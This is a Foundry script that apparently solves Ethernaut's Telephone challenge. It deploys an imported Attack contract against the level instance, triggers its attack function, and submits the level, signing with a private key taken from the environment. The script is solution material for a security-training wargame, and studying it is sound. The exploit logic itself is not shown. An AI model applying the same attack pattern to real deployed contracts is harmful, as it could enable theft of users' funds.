// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Telephone} from "../src/Level04.sol";
import {Attack} from "../src/Level04Attack.sol";

contract Deploy is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack(Telephone(vm.envAddress("LVL04_ADDR")));

        console2.log("attacker address: ", address(attack));

        vm.stopBroadcast();
    }
}

contract Level04 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        Telephone instance = Telephone(vm.envAddress("LVL04_ADDR"));
        Attack attack = Attack(vm.envAddress("LVL04ATTACK_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attack.attack();
        ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}
